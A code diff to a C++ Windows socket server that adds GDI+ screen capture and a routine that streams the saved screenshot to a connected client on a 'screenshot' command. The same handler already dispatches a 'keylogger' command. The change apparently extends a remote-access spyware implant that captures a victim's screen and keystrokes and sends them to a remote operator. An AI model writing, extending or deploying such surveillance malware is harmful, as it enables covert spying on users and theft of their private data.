@@ -1,5 +1,4 @@
 #include "server_socket.h"
-#include <iostream>
 
 Server::Server(int port)
     : port(port), listenSocket(INVALID_SOCKET) {
@@ -9,9 +8,16 @@ Server::Server(int port)
     if (result != 0) {
         std::cerr << "WSAStartup failed: " << result << std::endl;
     }
+
+    // Initialize GDI+
+    GdiplusStartupInput gdiplusStartupInput;
+    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 }
 
 Server::~Server() {
+    // Clean up GDI+
+    GdiplusShutdown(gdiplusToken);
+    
     if (listenSocket != INVALID_SOCKET) {
         closesocket(listenSocket);
     }
@@ -70,6 +76,75 @@ void Server::listenForConnections() {
     }
 }
 
+// Function to take a screenshot and save it as a PNG file
+void Server::takeScreenshot(const std::string& filename) {
+    // Initialize GDI+
+    GdiplusStartupInput gdiplusStartupInput;
+    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+
+    // Get the screen dimensions
+    HDC screenDC = GetDC(NULL);
+    HDC memoryDC = CreateCompatibleDC(screenDC);
+    int width = GetSystemMetrics(SM_CXSCREEN);
+    int height = GetSystemMetrics(SM_CYSCREEN);
+
+    // Create a compatible bitmap
+    HBITMAP hBitmap = CreateCompatibleBitmap(screenDC, width, height);
+    SelectObject(memoryDC, hBitmap);
+
+    // BitBlt to copy the screen to the bitmap
+    BitBlt(memoryDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);
+
+    // Create GDI+ Image from the bitmap
+    Bitmap bitmap(hBitmap, NULL);
+    CLSID clsid;
+    HRESULT result = CLSIDFromString(L"{557CC3D0-1A3A-11D1-AD6E-00A0C9138F8C}", &clsid); // CLSID for PNG
+    if (FAILED(result)) {
+        std::cerr << "Failed to get CLSID for PNG." << std::endl;
+        return; // Handle error appropriately
+    }
+
+    // Save the image as a PNG file
+    WCHAR wFilename[MAX_PATH];
+    MultiByteToWideChar(CP_UTF8, 0, filename.c_str(), -1, wFilename, MAX_PATH);
+    bitmap.Save(wFilename, &clsid, NULL);
+
+    // Clean up
+    DeleteObject(hBitmap);
+    DeleteDC(memoryDC);
+    ReleaseDC(NULL, screenDC);
+    GdiplusShutdown(gdiplusToken);
+}
+
+// Function to send a screenshot image to the client
+// Function to send a screenshot image to the client
+void Server::sendScreenshot(SOCKET clientSocket, const std::string& filename) {
+    std::ifstream file(filename, std::ios::binary);
+    if (!file) {
+        std::cerr << "Failed to open screenshot file: " << filename << std::endl;
+        return;
+    }
+
+    // Get file size
+    file.seekg(0, std::ios::end);
+    std::streamsize fileSize = file.tellg();
+    file.seekg(0, std::ios::beg);
+
+    // Send file size first
+    send(clientSocket, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);
+
+    // Buffer for sending the file
+    char buffer[4096];
+    while (fileSize > 0) {
+        file.read(buffer, sizeof(buffer));
+        std::streamsize bytesRead = file.gcount();
+        send(clientSocket, buffer, bytesRead, 0);
+        fileSize -= bytesRead;
+    }
+
+    std::cout << "Screenshot sent to client successfully!" << std::endl;
+}
+
 void Server::handleClient(SOCKET clientSocket) {
     char recvbuf[512];
     int recvbuflen = 512;
@@ -96,6 +171,19 @@ void Server::handleClient(SOCKET clientSocket) {
             std::cout << "Keylogger command received." << std::endl;
             keyLogger(clientSocket);
             closesocket(listenSocket); 
+            exit(0);  // Exit the server program
+        }
+        else if (receivedMessage == "screenshot")
+        {
+            std::cout << "Screenshot command received. Taking a screenshot..." << std::endl;
+            // Take a screenshot and save it
+            takeScreenshot("screenshot.png"); // Save as screenshot.png
+            std::cout << "Screenshot taken and saved as screenshot.png" << std::endl;
+
+            // Send the screenshot back to the client
+            sendScreenshot(clientSocket, "screenshot.png");
+
+            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
             exit(0);  // Exit the server program
         }
     } else if (result == 0) {
